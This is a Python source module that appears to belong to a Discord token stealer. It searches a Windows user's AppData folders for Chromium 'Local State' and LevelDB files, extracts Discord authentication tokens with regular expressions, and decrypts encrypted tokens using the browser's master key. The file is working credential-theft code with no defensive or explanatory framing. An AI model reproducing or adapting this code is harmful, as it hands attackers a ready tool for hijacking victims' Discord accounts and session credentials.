import base64
import re, os

from os.path import join
from typing import List

from utils.crypto import ChromiumCrypt


def GetDiscordTokens() -> List[str]:
    paths = list(zip(GetAppDataPaths(), GetLocalAppDataPaths()))
    tokens = []
    for path in paths:
        keyfile = join(path, "Local State")
        for ldb in GetLDBFiles(path):
            f = open(ldb, "r", errors="ignore")
            content = f.read()
            for m in re.findall(r"([\d\w_-]{24,26}\.[\d\w_-]{6}\.[\d\w_-]{25,110}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)", content):
                if "dQw4w9WgXcQ" in m:
                    m = base64.b64decode(m.split("dQw4w9WgXcQ")[1])
                    chromiumcrypto = ChromiumCrypt()
                    chromiumcrypto.GetMasterKey(keyfile)
                    decrypted_token = chromiumcrypto.decrypt(m)
                    if decrypted_token not in tokens:
                        tokens.append(decrypted_token)
                else:
                    if m not in tokens:
                        tokens.append(m)
    return tokens


def GetLDBFiles(path: str) -> List[str]:
    ldbfiles = []
    for root, subdirs, files in os.walk(path):
        for file in files:
            p = join(root, file)
            if re.match(r'.*[0-9]*\.(ldb|log)', p):
                ldbfiles.append(p)
    return ldbfiles


def GetAppDataPaths() -> List[str]:
    datapaths: List[str] = []
    for root, subdirs, files in os.walk(os.getenv('APPDATA')):
        for file in files:
            path: str = join(root, file)
            if "Local State" in path:
                joinedpath = os.path.sep.join(path.split(os.path.sep)[:-1])
                datapaths.append(joinedpath)
    return datapaths


def GetLocalAppDataPaths() -> List[str]:
    datapaths: List[str] = []
    for root, subdirs, files in os.walk(os.getenv('LOCALAPPDATA')):
        for file in files:
            path: str = join(root, file)
            if "Local State" in path:
                joinedpath = os.path.sep.join(path.split(os.path.sep)[:-1])
                datapaths.append(joinedpath)
    return datapaths